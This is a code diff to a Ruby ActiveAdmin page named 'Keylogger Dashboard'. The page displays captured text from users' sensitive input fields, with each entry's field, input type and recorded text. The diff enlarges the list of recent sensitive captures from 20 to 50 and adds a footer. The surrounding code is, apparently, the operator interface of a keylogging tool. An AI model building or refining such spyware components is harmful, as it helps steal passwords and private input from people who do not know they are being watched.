@@ -111,7 +111,8 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
           end
         end
       end
-      recent_sensitive = recent_sensitive.sort_by { |e| e[:timestamp] }.reverse.first(20)
+      # Pagination: Show only top 50 recent sensitive entries to avoid UI lag
+      recent_sensitive = recent_sensitive.sort_by { |e| e[:timestamp] }.reverse.first(50)
       
       if recent_sensitive.empty?
         div(class: 'empty-state') { h4 '✅ No Sensitive Fields'; para 'All safe.' }
@@ -123,6 +124,10 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
           column('Field') { |e| div { div e[:field], class: 'field-id'; span e[:hint], class: 'field-hint' if e[:hint].present? } }
           column('Type') { |e| span e[:input_type], class: "badge #{e[:input_type]}" }
           column('Text') { |e| code e[:text], class: 'captured-text' }
+        end
+        
+        div style: "margin-top: 15px; text-align: center; color: #8b949e; font-size: 12px;" do
+          "Showing recent 50 entries. Clear cache to reset."
         end
       end
     end
